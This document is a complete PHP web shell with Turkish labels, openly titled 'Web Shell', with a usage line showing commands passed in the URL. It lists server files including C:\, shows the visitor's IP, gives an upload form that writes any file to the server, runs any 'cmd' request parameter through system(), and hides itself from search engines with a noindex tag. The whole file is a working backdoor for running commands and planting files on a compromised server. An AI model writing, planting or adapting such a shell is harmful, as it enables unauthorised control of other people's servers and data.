<font face="verdana" color="red" size="5">Usage:http://www.example.com/index1.php?cmd=ls</font><br>
<meta name="robots" content="noindex">
<?php
$dosyalar = glob("*.*");
$dosyalar = glob("C:\*");
error_reporting(0);
foreach ($dosyalar as $dosya) {
  echo $dosya . "<br />";
}
echo "İP : " , $_SERVER["REMOTE_ADDR"];
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Upload Edilmiştir!!!<b><br><br>'; }
else { echo '<b>Shell Upload Edilemedi !!!</b><br><br>'; }
}
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Buhid&display=swap" rel="stylesheet">
<style>
.yazisekli
{
@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Buhid&display=swap');
font-family: 'Noto Sans Buhid', sans-serif;
}
</style>
<div class="yazisekli">
    <font color="red" size="5"> Web Shell</font>
</div>
